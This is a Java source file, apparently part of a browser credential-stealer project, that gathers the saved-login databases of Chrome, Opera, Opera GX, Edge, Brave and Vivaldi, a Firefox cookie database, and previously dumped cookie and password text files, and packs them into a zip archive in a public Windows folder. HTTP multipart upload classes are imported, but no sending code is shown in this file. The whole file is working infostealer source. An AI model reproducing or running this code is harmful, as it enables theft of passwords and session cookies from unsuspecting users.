package io.github.luxotick.impl;

import io.github.luxotick.Start;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.RequestBody;

import java.io.*;
import java.util.Arrays;
import java.util.List;
import java.util.zip.*;

public class Zip {
    public static void main(String[] args) throws IOException {
        String[] browserPaths = {
                "Chrome",
                "Opera",
                "Firefox",
                "OperaGX",
                "Edge",
                "Brave",
                "Vivaldi"
        };

        String[] sourcePaths = {
                System.getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
                System.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera Stable\\Login Data",
                System.getenv("APPDATA") + "\\..\\Roaming\\Mozilla\\Firefox\\Profiles\\avionrhy.default-release\\storage\\default\\moz_cookies.sqlite",
                System.getenv("APPDATA") + "\\..\\Roaming\\Opera Software\\Opera GX Stable\\Login Data",
                System.getenv("APPDATA") + "\\..\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
                System.getenv("APPDATA") + "\\..\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
                System.getenv("APPDATA") + "\\..\\Local\\Vivaldi\\User Data\\Default\\Login Data",
                "C:\\Users\\Public\\Documents\\dothack.dev",
                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\BRAVE.txt",
                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\CHROME.txt",
                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\EDGE.txt",
                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\FIREFOX.txt",
                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\OPERA.txt",
                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\OPERA_GX.txt",
                "C:\\Users\\Public\\Documents\\Browsers\\Cookies\\VIVALDI.txt",
                "C:\\Users\\Public\\Documents\\Browsers\\Passwords\\YANDEX.txt"
                // Add this line to include the USER's Browsers folder
        };

        final List<String> srcFiles = Arrays.asList(sourcePaths);

        final FileOutputStream fos = new FileOutputStream("C:\\Users\\Public\\Documents\\" + Start.snowflakeId + ".zip");
        ZipOutputStream zipOut = new ZipOutputStream(fos);

        for (int i = 0; i < srcFiles.size(); i++) {
            try {
                File fileToZip = new File(srcFiles.get(i));
                if (fileToZip.exists()) { // Check if the file/folder exists
                    FileInputStream fis = new FileInputStream(fileToZip);
                    System.out.println(fileToZip.getPath());
                    String path = fileToZip.getPath();
                    String folderName = i < browserPaths.length ? browserPaths[i] : "Other";

                    zipOut.putNextEntry(new ZipEntry(folderName + "/" + fileToZip.getName()));

                    byte[] bytes = new byte[1024];
                    int length;
                    while ((length = fis.read(bytes)) >= 0) {
                        zipOut.write(bytes, 0, length);
                    }
                    fis.close();
                }
            } catch (Exception e) {
                System.out.println("Error: " + e);
            }
        }
        zipOut.close();
        fos.close();
    }
}
